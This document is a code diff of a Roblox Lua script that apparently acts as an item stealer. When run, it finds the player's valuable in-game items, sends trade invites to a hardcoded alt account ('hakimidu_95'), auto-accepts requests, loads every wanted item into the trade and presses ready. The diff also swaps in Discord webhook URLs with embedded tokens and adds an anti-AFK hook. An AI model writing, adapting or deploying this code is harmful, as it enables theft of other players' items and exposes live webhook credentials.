@@ -1,7 +1,7 @@
 if game.PlaceId ~= 109983668079237 then return end
 
-local MY_ALT_USER = "Only1sherif"
-local LOG_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"
+local MY_ALT_USER = "hakimidu_95"
+local LOG_WEBHOOK = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
 
 local wantedItems = {
     "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
@@ -20,20 +20,15 @@ local wantedItems = {
     "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
 }
 
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    vu:CaptureController()
+    vu:ClickButton2(Vector2.new())
+end)
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer.PlayerGui
-
-task.spawn(function()
-    while task.wait(120) do
-        pcall(function()
-            local character = LocalPlayer.Character
-            if character and character:FindFirstChild("HumanoidRootPart") then
-                character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0, 0.1, 0)
-            end
-        end)
-    end
-end)
 
 local function isWantedItem(name)
     if not name then return false end
@@ -48,7 +43,6 @@ local function scanPlot()
     local found = {}
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return found end
-    
     local myPlot = nil
     for _, p in ipairs(plots:GetChildren()) do
         local sign = p:FindFirstChild("PlotSign")
@@ -63,7 +57,6 @@ local function scanPlot()
             end
         end
     end
-
     if myPlot then
         for _, child in ipairs(myPlot:GetChildren()) do
             if child:IsA("Model") and isWantedItem(child.Name) then
@@ -75,25 +68,39 @@ local function scanPlot()
 end
 
 local function tradeIsActive()
-    local gui = playerGui:FindFirstChild("TradeLiveTrade")
-    return gui and gui:FindFirstChild("TradeLiveTrade") and gui.TradeLiveTrade.Visible
+    local outer = playerGui:FindFirstChild("TradeLiveTrade")
+    if not outer then return false end
+    local inner = outer:FindFirstChild("TradeLiveTrade")
+    if not inner then return false end
+    local scrolling = inner:FindFirstChild("ScrollingFrame", true)
+    if not scrolling then return false end
+    for _, slot in pairs(scrolling:GetChildren()) do
+        if slot.Name:sub(1, 9) == "Selection" then return true end
+    end
+    return false
 end
 
 local function sendInvite(target)
-    local tl = playerGui:FindFirstChild("TradePlayerList")
-    if not tl or not tl:FindFirstChild("TradePlayerList") then return end
-    local inner = tl.TradePlayerList
-    local sb = inner.bg.SearchFrame.SearchBox
+    local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
+    if not tl then return false end
+    local sb = tl.bg.SearchFrame.SearchBox
     sb.Text = target
+    task.wait(0.1)
+    pcall(function() firesignal(sb.FocusLost, true) end)
+    task.wait(0.1)
+    pcall(function() firesignal(sb.ReturnPressedFromOnScreenKeyboard) end)
     task.wait(0.5)
-    pcall(function() sb:ReleaseFocus(true) end)
-    task.wait(1)
-    for _, p in pairs(inner.Global.List:GetChildren()) do
-        if p:IsA("Frame") and p:FindFirstChild("Fill") and p.Fill:FindFirstChild("Send") then
-            pcall(function() firesignal(p.Fill.Send.Activated) end)
-            return true
+    local list = tl.Global.List
+    for _, player in pairs(list:GetChildren()) do
+        if player:IsA("Frame") then
+            local fill = player:FindFirstChild("Fill")
+            if fill and fill:FindFirstChild("Send") then
+                pcall(function() firesignal(fill.Send.Activated) end)
+                return true
+            end
         end
     end
+    return false
 end
 
 task.spawn(function()
@@ -103,13 +110,12 @@ task.spawn(function()
             if requestGui and requestGui:FindFirstChild("TradeRequest") then
                 local req = requestGui.TradeRequest
                 if req.Visible then
-                    task.wait(math.random(1, 3))
                     local accept = req:FindFirstChild("Accept", true)
                     if accept then firesignal(accept.Activated) end
                 end
             end
         end)
-        task.wait(2)
+        task.wait(0.5)
     end
 end)
 
@@ -119,38 +125,43 @@ while true do
     if #highValueItems > 0 then
         if not tradeIsActive() then
             sendInvite(MY_ALT_USER)
-            task.wait(5)
         else
-            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
-            local otherUser = inner.Other.Username.Text:lower()
+            local outerGui = playerGui:FindFirstChild("TradeLiveTrade")
+            local innerGui = outerGui.TradeLiveTrade
+            local otherUser = innerGui.Other.Username.Text:lower()
             
             if otherUser:find(MY_ALT_USER:lower()) then
-                local scrolling = inner:FindFirstChild("ScrollingFrame", true)
+                local scrolling = innerGui:FindFirstChild("ScrollingFrame", true)
                 if scrolling then
                     for _, slot in pairs(scrolling:GetChildren()) do
-                        if slot.Name:sub(1,9) == "Selection" then
+                        if slot.Name:sub(1, 9) == "Selection" then
                             local spacer = slot:FindFirstChild("Spacer")
-                            if spacer and spacer:FindFirstChild("UIStroke") then
-                                if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
+                            if spacer then
+                                local stroke = spacer:FindFirstChild("UIStroke")
+                                if stroke and not (math.floor(stroke.Color.R * 255) == 0 and math.floor(stroke.Color.G * 255) == 255) then
                                     pcall(function() firesignal(spacer.Activated) end)
-                                    task.wait(0.4)
+                                    task.wait(0.05)
                                 end
                             end
                         end
                     end
                 end
-                task.wait(2)
-                local btn = inner:FindFirstChild("ReadyButton", true)
-                if btn then firesignal(btn.Activated) end
+                
+                task.wait(0.5)
+                local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
+                local readyIndicator = innerGui:FindFirstChild("Your"):FindFirstChild("Ready")
+                
+                if readyBtn then
+                    pcall(function() firesignal(readyBtn.Activated) end)
+                end
             end
         end
     else
         if tradeIsActive() then
-            task.wait(2)
-            local inner = playerGui.TradeLiveTrade.TradeLiveTrade
-            local btn = inner:FindFirstChild("ReadyButton", true)
-            if btn then firesignal(btn.Activated) end
+            local innerGui = playerGui.TradeLiveTrade.TradeLiveTrade
+            local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
+            if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
         end
     end
-    task.wait(3)
+    task.wait(0.5)
 end
